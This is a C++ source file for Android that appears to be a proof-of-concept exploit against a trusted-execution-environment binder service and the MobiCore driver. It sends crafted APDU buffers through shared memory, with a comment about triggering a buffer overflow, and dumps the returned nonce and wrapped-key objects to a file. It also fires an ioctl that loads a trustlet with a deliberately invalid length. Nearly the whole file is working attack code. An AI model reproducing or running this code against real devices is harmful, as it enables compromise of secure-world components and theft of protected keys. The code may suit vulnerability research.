#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <utils/Log.h>
#include <binder/IPCThreadState.h>
#include <cutils/ashmem.h>

#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>

#include <sys/time.h>

#include "mc_user.h"
#include "mcloadformat.h"

namespace android{

// get the name of the generic interface we hold a reference to
static String16 get_interface_name(sp<IBinder> service)
{
    if (service != NULL) {
        Parcel data, reply;
        status_t err = service->transact(IBinder::INTERFACE_TRANSACTION, data, &reply);
        if (err == NO_ERROR) {
            return reply.readString16();
        }
    }
    return String16();
}

struct Tee {
  public:

    Tee();
    int doExp(int sendlen_, char *filename, int cmd);
    int doMC();

    status_t initCheck() const;

  private:

        status_t mInitCheck;
        status_t initTEE();

        sp<IBinder> mBinder;
	String16 mIfName;

  protected:
        virtual ~Tee(){};
};

Tee::Tee()
    : mInitCheck(NO_INIT) {
    mInitCheck = initTEE();
}

status_t Tee::initCheck() const {
    return mInitCheck;
}

status_t Tee::initTEE() {
    sp<IServiceManager> sm = defaultServiceManager();
    //mBinder = sm->checkService(String16("ESECOMM"));
    mBinder = sm->checkService(String16("CCM"));
    mIfName = get_interface_name(mBinder);
 
    return OK; //NO_INIT;
}

int Tee::doMC(){

    int fd = open("/dev/mobicore-user", O_RDONLY);
    if (fd == -1){
        printf("open failed!\n");
    }
    else{
        printf("Open success fd: %d\n", fd);
    }


    //now fire an ioctl to load a trustlet with invalid len
    struct mc_ioctl_open_trustlet trustlet;
    struct mclf_header_v2 hdr;
    hdr.service_type == SERVICE_TYPE_SP_TRUSTLET;

    trustlet.sid = 0;
    trustlet.spid = 0;
    trustlet.buffer = (unsigned long long) &hdr;
    trustlet.tlen = 0xFFFFFFF0;
    trustlet.tci = 0;
    trustlet.tcilen = 0; 
    trustlet.pid = 0;
    trustlet.flags = 0;

    ioctl(fd, MC_IO_OPEN_TRUSTLET, &trustlet);

    return 1;
}

int Tee::doExp(int sendlen_, char *filename, int cmd){

    Parcel data1, data, reply;
    uint32_t code;
    uint32_t sendlen = sendlen_;
    if (sendlen == 0){
        sendlen = 4416;
    }
    uint32_t recvlen = 4416; //BOF if sendlen is 512
    int fd;
    int i;
    int recvd_len;
    int offs;
    unsigned int nlen;
    unsigned int ret;
    uint8_t *shm;
    uint8_t *shm_payload;
    uint8_t *shm_resp;
    char *name = (char *) "ashmem";
    status_t st;

    //first, we have to open the connection

    code = 0; //OPENSWCONN
    st = data1.writeInterfaceToken(mIfName);
    printf("writeInterfaceToken: %d\n", st);
    mBinder->transact(code, data1, &reply, 1);
    printf("OPENSWCONN transact finished: %s\n",String8(reply.readString16()).string());

    //second, we have to ASHMEM a range
  
    code = 3;

    fd = ashmem_create_region(name, sendlen+recvlen);
    printf("ashmem fd: %d\n", fd);
    ashmem_pin_region(fd, 0, 0);

    shm = (uint8_t *) mmap(NULL, sendlen+recvlen, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    memset(shm, 0x00, sendlen+recvlen);

    //third, we have to send the requested command

    int pfd;
    if (filename == NULL){
        printf("openning apdu.bin\n");
        pfd = open("/data/local/tmp/apdu.bin", O_RDONLY);
    }
    else{
        printf("openning %s\n", filename);
        pfd = open(filename, O_RDONLY);
    }

    int read_bytes;
    printf("pfd = %d\n", pfd);
    read_bytes = read(pfd, shm, sendlen);
    printf("read_bytes = %d\n", read_bytes);
    close(pfd);

    if ((uint32_t)read_bytes > sendlen){
        printf("read_bytes wrong!\n");
	return -1;
    }

    //respmsg->total_len: 0x200 (512)
    shm_resp = shm + sendlen;

    printf("shm created: %p\n", shm);
    st = data.writeInterfaceToken(mIfName);
    printf("writeInterfaceToken: %d\n", st);
    st = data.writeInt32(recvlen);
    printf("writeInt32: %d\n", st);
    st = data.writeInt32(sendlen);
    printf("writeInt32: %d\n", st);
    //now we have to write a filedescriptor for mmap'ed buffer.
    st = data.writeFileDescriptor(fd, 0);
    printf("writeFileDescriptor: %d\n", st);

    mBinder->transact(code, data, &reply, 0); 
    //printf("transact finished: %s\n",String8(reply.readString16()).string());
    recvd_len = reply.readInt32();
    printf("recv bytes len: %d\n", recvd_len);

    //hdr
    shm = shm + 16;
    ret = *(unsigned int *)(shm);
    printf("ret: 0x%08x\n", ret);

    //nonce command
    if (cmd == 1){
        nlen = *(unsigned int *)(shm + 4 + 32);
        offs = 4;
    }
    //wrap command
    else if (cmd == 2){
	//48: length of hash+pad at the end, 0x2C: header in front of wrapped obj
        nlen = *(unsigned int *)(shm + 8 + 2048);
        offs = 8;
    }

    //setpwd command - no need for response
    else if (cmd == 3){
        return 1;
    }

    else{
        printf("invalid cmd %d!\n", cmd);
        return -1;
    }

    printf("obj len: %d\n", nlen);
    printf("obj:\n");
    for (i = 0; i < nlen; i++){
        printf("%02x ", shm[offs+i]);
    }
    printf("\n");

    pfd = open("/data/local/tmp/output.bin", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG);
    printf("pfd: %d\n", pfd);
    ret = write(pfd, shm + offs, nlen);
    printf("write: %d\n", ret);
    close(pfd);

    return 0;
}

}
using namespace android;
int main(int argc, char **argv){
    int sendlen = 0;
    char *apdu_filename = NULL;
    int cmd = 0;

    /*
    if (argc > 1){
        sendlen = atoi(argv[1]);
    }
    if (argc > 2){
        apdu_filename = argv[2];
    }
    */

    if (argc > 1){
        cmd = atoi(argv[1]);
        printf("cmd is: %d\n", cmd);
    }

    Tee* teezer = new Tee();
    teezer->doExp(sendlen, apdu_filename, cmd);
    //teezer->doMC();

    return 0;
}
